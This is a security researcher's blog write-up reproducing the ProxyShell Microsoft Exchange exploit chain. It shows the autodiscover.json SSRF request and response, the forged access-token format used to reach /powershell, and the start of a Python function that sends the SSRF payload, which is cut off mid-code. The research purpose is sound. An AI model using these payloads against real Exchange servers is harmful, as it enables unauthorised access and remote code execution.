<!DOCTYPE html>
<html>
  <!-- meta/link... -->
  



<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <!-- Global site tag (gtag.js) - Google Analytics -->


  <title>My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai) | Quang Vo</title>

  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
  
  
  
  
<link rel="stylesheet" href="/css/animate.min.css">

  
<link rel="stylesheet" href="/css/style.css">

  
  
    <link href="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
  
  
    
<link rel="stylesheet" href="/js/shareJs/share.min.css">

  
  <style>
        @media (max-width: 992px) {
            #waifu {
                display: none;
            }
        }
    </style>
    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">

    
    
    <!-- 依赖于jquery和vue -->
    <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
    <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>

    <!-- import link -->
    
        
            
        
            
        
    
    <!-- import script -->
    
        
            
        
            
        
    

<meta name="generator" content="Hexo 8.1.1"></head>

  
  <!-- 预加载动画 -->
  
  
  <div class="preloader_6" id="loader">
  <div class="loader"></div>
</div>
  <script>
    var endLoading = function () {
      document.body.style.overflow = 'auto';
      document.getElementById('loader').classList.add("loaded");
    }
    window.addEventListener('DOMContentLoaded', endLoading);
  </script>


  <body>
    <!-- 判断是否为暗黑风格 -->
    <!-- 判断是否为黑夜模式 -->
<script defer>
  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('true');

  if (isDark) {
    $(document.body).addClass('darkModel');
  }
</script>

    <!-- 需要在上面加载的js -->
    <script>
  function loadScript(src, cb) {
    return new Promise(resolve => {
      setTimeout(function () {
        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript");
        if (cb) {
          if (JSON.stringify(cb)) {
            for (let p in cb) {
              if (p == "onload") {
                script[p] = () => {
                  cb[p]()
                  resolve()
                }
              } else {
                script[p] = cb[p]
                script.onload = resolve
              }
            }
          } else {
            script.onload = () => {
              cb()
              resolve()
            };
          }
        } else {
          script.onload = resolve
        }
        script.setAttribute("src", src);
        HEAD.appendChild(script);
      });
    });
  }

  //https://github.com/filamentgroup/loadCSS
  var loadCSS = function (src) {
    return new Promise(resolve => {
      setTimeout(function () {
        var link = document.createElement('link');
        link.rel = "stylesheet";
        link.href = src;
        link.onload = resolve;
        document.getElementsByTagName("head")[0].appendChild(link);
      });
    });
  };

</script> 

<!-- 轮播图所需要的js -->
<script src="/js/swiper/swiper.min.js"></script>
<script src="/js/swiper/vue-awesome-swiper.js"></script>
<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>

<script type="text/javascript">
  Vue.use(window.VueAwesomeSwiper)
</script>


  <script src="/js/vue-typed-js/index.js"></script>


<!-- 首页的公告滚动插件的js需要重新加载 -->
<script src="/js/vue-seamless-scroll/index.js"></script>

<!-- 打字机效果js -->
<script src="https://unpkg.com/typed.js@2.0.11"></script>


    <div id="safearea">
      <main class="main" id="pjax-container">
        <!-- 头部导航 -->
        
<header class="header  " 
  id="navHeader"
  style="position: fixed;
  left: 0; top: 0; z-index: 10;width: 100%;"
>
  <div class="header-content">
    <div class="bars">
      <div id="appDrawer" class="sidebar-image">
  <div class="drawer-box-icon">
    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
  </div>
  
  <transition name="fade">
    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
    </div>
  </transition>
  <div class="drawer-box" :class="{'active': visible}">
    <div class="drawer-box-head bg-color">
      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
      <h3 class="drawer-box-head_title">Quang Vo</h3>
      <h5 class="drawer-box-head_desc"></h5>
    </div>
    
    <div class="drawer-box-content">
      <ul class="drawer-box-content_menu">
        
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/" class="drawer-menu-item-link">
                  
                    <i class="fas fa-home" aria-hidden="true"></i>
                  
                  <span class="name">Home</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/archives" class="drawer-menu-item-link">
                  
                    <i class="fas fa-archive" aria-hidden="true"></i>
                  
                  <span class="name">Archives</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/tags" class="drawer-menu-item-link">
                  
                    <i class="fas fa-tags" aria-hidden="true"></i>
                  
                  <span class="name">Tags</span>
                </a>
              
            </li>
          
            <li class="drawer-box-content_item" style="position: relative;">
              
                <a href="/categories" class="drawer-menu-item-link">
                  
                    <i class="fas fa-bookmark" aria-hidden="true"></i>
                  
                  <span class="name">Categories</span>
                </a>
              
            </li>
          
        
        
          <li class="drawer-box-content_item">
            <a target="_blank" rel="noopener" href="https://github.com/mr-r3bot">
              <i class="fas fa-github" aria-hidden="true"></i>
              <span>Github</span>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</div>

<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appDrawer',
    data: {
      visible: false,
      top: 0,
      openArr: [],
    },
    computed: {
    },
    mounted() {
    },
    methods: {
      isOpen(index) {
        if (this.openArr.includes(index)) {
          return true;
        } else {
          return false;
        }
      },
      openOrCloseMenu(curIndex) {
        const index = this.openArr.indexOf(curIndex);
        if (index !== -1) {
          this.openArr.splice(index, 1);
        } else {
          this.openArr.push(curIndex);
        }
      },
      showDialogDrawer() {
        this.visible = true;
        // 防止页面滚动，只能让弹框滚动
        this.top = $(document).scrollTop()
        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
      },
      cancelDialogDrawer() {
        this.visible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      }
    },
    created() {}
  })
</script>

    </div>
    <div class="blog-title" id="author-avatar">
      
        <div class="avatar">
          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
        </div>
      
      <a href="/" class="logo">Quang Vo</a>
    </div>
    <nav class="navbar">
      <ul class="menu">
        
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/" class="menu-item-link" title="Home">
                  
                    <i class="fas fa-home" aria-hidden="true"></i>
                  
                  <span class="name">Home</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/archives" class="menu-item-link" title="Archives">
                  
                    <i class="fas fa-archive" aria-hidden="true"></i>
                  
                  <span class="name">Archives</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/tags" class="menu-item-link" title="Tags">
                  
                    <i class="fas fa-tags" aria-hidden="true"></i>
                  
                  <span class="name">Tags</span>
                </a>
              
            </li>
          
            <li class="menu-item" style="position: relative;">
              
                <a href="/categories" class="menu-item-link" title="Categories">
                  
                    <i class="fas fa-bookmark" aria-hidden="true"></i>
                  
                  <span class="name">Categories</span>
                </a>
              
            </li>
          
        
      </ul>
      
      
        <div id="appSearch">
  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
  <transition name="fade">
    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
      <div class="message-box animated bounceInDown">
        <h2>
          <span>
            <i class="fas fa-search" aria-hidden="true"></i>
            <span class="title">Search</span>
          </span>
          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
        </h2>
        <form class="site-search-form">
          <input type="text"
            placeholder="Please enter keywords"
            id="local-search-input" 
            @click="getSearchFile()"
            class="st-search-input"
            v-model="searchInput"
          />
        </form>
        <div class="result-wrapper">
          <div id="local-search-result" class="local-search-result-cls"></div>
        </div>
      </div>
    </div>
  </transition>
</div>
<script src="/js/local_search.js"></script>
<script>
  var body = document.body || document.documentElement || window;
  var vm = new Vue({
    el: '#appSearch',
    data: {
      dialogVisible: false,
      searchInput: '',
      top: 0,
    },
    computed: {
    },
    mounted() {
      window.addEventListener('pjax:complete', () => {
        this.cancelDialogVisible();
      })
    },
    methods: {
      showDialog() {
        this.dialogVisible = true;
        // 防止页面滚动，只能让弹框滚动
        this.top = $(document).scrollTop()
        body.style.cssText = 'overflow: hidden;';
      },
      getSearchFile() {
        if (!this.searchInput) {
          getSearchFile("/search.xml");
        }
      },
      cancelDialogVisible() {
        this.dialogVisible = false;
        body.removeAttribute('style');
        $(document).scrollTop(this.top)
      },
    },
    created() {}
  })
</script>
<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
<!-- 下面是搜索基本写法 -->
<!-- <script type="text/javascript" id="local.search.active">
  var inputArea = document.querySelector("#local-search-input");
  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
</script> -->

      

    </nav>
  </div>
  
    <a target="_blank" rel="noopener" href="https://github.com/mr-r3bot" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
  
  
</header>
        <!-- 内容区域 -->
        
<!-- prismjs 代码高亮 -->




<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>


  <!-- 文章详情页顶部图片和标题 -->




<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
  background-position: center center;position: relative;background-image:url('https://pic4.zhimg.com/80/v2-e434e3a2888fb4efb1844845b8791d1f_1440w.webp')">
  <div class="post-detail-header-mask"></div>
  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
  
  <div class="post-detail-header_info-box">
    <div class="title-box">
      <span class="title">
        My journey to reproduce the Proxyshell exploit chain (reported by Orange Tsai)
      </span>
    </div>
    
    
      
        <span class="post-detail-header_date">
          <i class="fas fa-calendar"></i> Published in：2021-08-16 |
        </span>
      

      
        <span class="post-detail-header_categories">
          <i class="iconfont iconbookmark1"></i> category：
          
            <a href="/categories/research/" class="post-detail-header_category">
              research
            </a>
          
        </span>
      

      
    
  </div>
  
  
</div>





<div class="post-detail-content post-row" 
  style="padding-top: 0px;">
  <div class="main-content">
    <article class="post post-detail">
      <div class="post-content">
        <h2 id="ProxyShell-Microsoft-Exchange"><a href="#ProxyShell-Microsoft-Exchange" class="headerlink" title="ProxyShell Microsoft Exchange"></a>ProxyShell Microsoft Exchange</h2><p>Reference: </p>
<ul>
<li>The original talk is from Orange Tsai: <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf?fbclid=IwAR2V0-4k2yb8dmPP5Mksd8iHYTOfE6sBwygMt4wjq3M9be8Tw6TlH0andhA</a></li>
<li>Amazing research write up from peterjson and Jang:<a target="_blank" rel="noopener" href="https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1"> https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1</a></li>
<li>Another amazing write up: <a target="_blank" rel="noopener" href="https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/">https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</a></li>
</ul>
<h3 id="1-Pre-auth-SSRF"><a href="#1-Pre-auth-SSRF" class="headerlink" title="1. Pre-auth SSRF"></a>1. Pre-auth SSRF</h3><p>The endpoint <code>/autodiscover.json</code> is one of the endpoints that we can access without authentication</p>
<img width="1413" alt="image" src="https://user-images.githubusercontent.com/37280106/129542517-f35ab234-4613-491c-844a-75e88fbf8da8.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129542517-f35ab234-4613-491c-844a-75e88fbf8da8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>If our URL end with <code>/autodiscover.json</code> , <code>ClientRequest</code> will fetch the param <code>Email</code> </p>
<img width="1262" alt="image" src="https://user-images.githubusercontent.com/37280106/129544327-4c4fe18e-eb19-4466-a616-aff25e3a4087.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129544327-4c4fe18e-eb19-4466-a616-aff25e3a4087.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p><code>explicitLogonAddress</code> must contains valid email address</p>
<p>So if our <code>explicitLogonAddress=/autodiscover/autodiscover.json?a=a@test.com</code> then the <code>/autodiscover/autodiscover.json?a=a@test.com</code> part will be removed from the URI.</p>
<p>ex: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://exchange.local/autodiscover/autodiscover.json@test.com/mapi/nspi?&amp;Email=autodiscover/autodiscover.json%3F@test.com</span><br></pre></td></tr></table></figure>
<p>Will become</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://exchange.local/mapi/nspi?&amp;Email=autodiscover/autodiscover.json%3F@test.com</span><br></pre></td></tr></table></figure>

<p>When preparing request to send to backend internal, Exchange will generate Kerberos auth header and attach into Authorization header. This is why we can reach some other endpoint without any authentication</p>
<p>The Fatal erase: </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /autodiscover/autodiscover.json?@test.com/mapi/nspi?&amp;Email=autodiscover/autodiscover.json%3F@test.com HTTP/2</span><br><span class="line">Host: exchange.local</span><br><span class="line">Cookie: cookieTest=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Te: trailers</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Cache-Control: private</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Server: Microsoft-IIS/10.0</span><br><span class="line">Request-Id: 505bae40-9e29-4c22-9bb6-68686012d721</span><br><span class="line">X-Calculatedbetarget: win-mkl80dild4h.exchange.local</span><br><span class="line">X-Serverapplication: Exchange/15.01.2176.009</span><br><span class="line">X-Diaginfo: WIN-MKL80DILD4H</span><br><span class="line">X-Beserver: WIN-MKL80DILD4H</span><br><span class="line">X-Aspnet-Version: 4.0.30319</span><br><span class="line">Set-Cookie: X-BackEndCookie=; expires=Thu, 15-Aug-1991 03:08:59 GMT; path=/autodiscover; secure; HttpOnly</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">X-Feserver: WIN-MKL80DILD4H</span><br><span class="line">Date: Sun, 15 Aug 2021 03:08:58 GMT</span><br><span class="line">Content-Length: 553</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Exchange MAPI/HTTP Connectivity Endpoint&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Exchange MAPI/HTTP Connectivity Endpoint&lt;br&gt;&lt;br&gt;Version: 15.1.2176.9&lt;br&gt;Vdir Path: /mapi/nspi/&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;</span><br></pre></td></tr></table></figure>

<img width="1146" alt="image" src="https://user-images.githubusercontent.com/37280106/129546779-695fca9d-dd4c-47d2-a498-5feb214f5df5.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129546779-695fca9d-dd4c-47d2-a498-5feb214f5df5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>We archieved the Pre-auth SSRF, direct access to Exchange Server back-end !!!</p>
<h3 id="2-Exchange-Powershell-Remoting"><a href="#2-Exchange-Powershell-Remoting" class="headerlink" title="2. Exchange Powershell Remoting"></a>2. Exchange Powershell Remoting</h3><p>The Exchange PowerShell Remoting is built upon PowerShell API and uses the Runspace for isolations. All operations are based on WinRM protocol</p>
<p>We need to look for the way to access <code>/powershell</code> endpoint, by accessing <code>/powershell</code> endpoint, we are one-step closer to the final goal - RCE</p>
<p>From Orange Tsai’s talk, he said that because we access the endpoint with <code>NT\SYSTEM</code> priviledge, we will fail the business logic since <code>SYSTEM</code> does not have any mailbox.</p>
<p>We cannot forge the <code>X-CommonAccessToken</code> because it’s in the blacklisted cookies&#x2F;headers</p>
<img width="1318" alt="image" src="https://user-images.githubusercontent.com/37280106/129550275-02ca7e41-d165-49da-8bf7-0ba303b5ab98.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129550275-02ca7e41-d165-49da-8bf7-0ba303b5ab98.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">



<p>A few modules we should pay attention to</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft.Exchange.Security</span><br><span class="line">Microsoft.Exchange.PwshClient</span><br><span class="line">Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule</span><br><span class="line">BackendRehydrationModule</span><br></pre></td></tr></table></figure>


<p>From the Orange Tsai’s talk, we know that the <code>BackendRehydrationModule</code> play an important part in authentication process</p>
<img width="1207" alt="image" src="https://user-images.githubusercontent.com/37280106/129551467-54e67b8e-3232-483b-9bcc-ddfe14de00eb.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129551467-54e67b8e-3232-483b-9bcc-ddfe14de00eb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<blockquote>
<p> Microsoft.Exchange.Security.Authentication.BackendRehydrationModule</p>
</blockquote>
<img width="1048" alt="image" src="https://user-images.githubusercontent.com/37280106/129550769-a21e228c-5ef9-4fd2-89c4-5152a4fe117c.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129550769-a21e228c-5ef9-4fd2-89c4-5152a4fe117c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>We cannot access <code>/powershell</code> endpoint because we don’t have <code>X-CommonAccessToken</code> header, we cannot forge the <code>X-CommonAccessToken: &lt;token&gt;</code> to impersonate other user because <code>X-CommonAccessToken</code> is in the blacklisted headers. So what to do ?</p>
<p>Lucky for us, we have a module is called before the <code>BackendRehydrationModule</code> and it extract Access-Token fromURL</p>
<blockquote>
<p>Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule</p>
</blockquote>
<img width="1027" alt="image" src="https://user-images.githubusercontent.com/37280106/129552591-36cdf54c-ae20-462a-954a-f7d4e21d981c.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129552591-36cdf54c-ae20-462a-954a-f7d4e21d981c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">


<img width="1033" alt="image" src="https://user-images.githubusercontent.com/37280106/129552443-e99e7e9b-7690-476f-8ca4-73d857621627.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129552443-e99e7e9b-7690-476f-8ca4-73d857621627.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>The code’s logic look for <code>X-CommonAccessToken</code> header, if the header is not exist, it will extract <code>X-RPS-CAT</code> param and deserialize it as a Access Token (<code>X-CommonAccessToken</code> )</p>
<blockquote>
<p>Microsoft.Exchange.Security.Authorization.CommonAccessToken ( serialization process)</p>
</blockquote>
<img width="1041" alt="image" src="https://user-images.githubusercontent.com/37280106/129540035-3ab2be12-3540-45dd-85a4-bdb7aeb89581.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129540035-3ab2be12-3540-45dd-85a4-bdb7aeb89581.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">



<blockquote>
<p>Microsoft.Exchange.Security.Authorization.CommonAccessToken (deserialization process)</p>
</blockquote>
<img width="1073" alt="image" src="https://user-images.githubusercontent.com/37280106/129540057-3b6def40-f842-4283-aca9-13c20ef48842.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129540057-3b6def40-f842-4283-aca9-13c20ef48842.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<p>The pseudo code for the token deserialization:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V + this.Version + T + this.TokenType C + compress + data</span><br><span class="line">if compress =&gt; decompress</span><br><span class="line">if AccessTokenType is Windows =&gt; DeserializeFromToken</span><br></pre></td></tr></table></figure>

<img width="970" alt="image" src="https://user-images.githubusercontent.com/37280106/129553511-6abd50c8-3fc3-49a9-8c92-59b0311e7916.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129553511-6abd50c8-3fc3-49a9-8c92-59b0311e7916.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">

<img width="1074" alt="image" src="https://user-images.githubusercontent.com/37280106/129553904-94303325-c9b9-485a-a082-dc6de45305f9.png" class="lazyload placeholder" data-srcset="https://user-images.githubusercontent.com/37280106/129553904-94303325-c9b9-485a-a082-dc6de45305f9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">


<p>Pseudo code for DeserializeFromToken</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A + this.AuthenticationType + L + this.LogonName + U + UserSID + G + Group Length + GroupSids</span><br></pre></td></tr></table></figure>

<p>Now, we can craft an admin privilege CommonAccessToken via “X-Rps-CAT” parameter since we know how the Token is constructed</p>
<p>We need a UserSID to craft our token</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_sid</span>(<span class="params">url: <span class="built_in">str</span>, email: <span class="built_in">str</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Getting LegacyDN&quot;</span>)</span><br><span class="line">    body = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;&lt;Request&gt;&lt;EMailAddress&gt;<span class="subst">&#123;email&#125;</span>&lt;/EMailAddress&gt;&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;&lt;/Request&gt;&lt;/Autodiscover&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    autodiscover_url = url + <span class="string">f&quot;/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&amp;Email=autodiscover/autodiscover.json%3F@test.com&quot;</span></span><br><span class="line">    resp = requests.post(autodiscover_url, headers=&#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span></span><br><span class="line">    &#125;, data=body.encode(<span class="string">&quot;utf-8&quot;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">    autodiscover_xml = ET.fromstring(resp.text)</span><br><span class="line">    legacydn = autodiscover_xml.find(<span class="string">&#x27;&#123;*&#125;Response/&#123;*&#125;User/&#123;*&#125;LegacyDN&#x27;</span>).text</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Successfully get LegacyDN&quot;</span>)</span><br><span class="line">    data = legacydn</span><br><span class="line">    data += <span class="string">&#x27;\x00\x00\x00\x00\x00\xe4\x04&#x27;</span></span><br><span class="line">    data += <span class="string">&#x27;\x00\x00\x09\x04\x00\x00\x09&#x27;</span></span><br><span class="line">    data += <span class="string">&#x27;\x04\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Requesttype&quot;</span>: <span class="string">&#x27;Connect&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;X-Clientapplication&quot;</span>: <span class="string">&#x27;Outlook/15.1.2176.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requestid&quot;</span>: <span class="string">&#x27;anything&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/mapi-http&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Getting User SID&quot;</span>)</span><br><span class="line">    sid_endpoint = url + <span 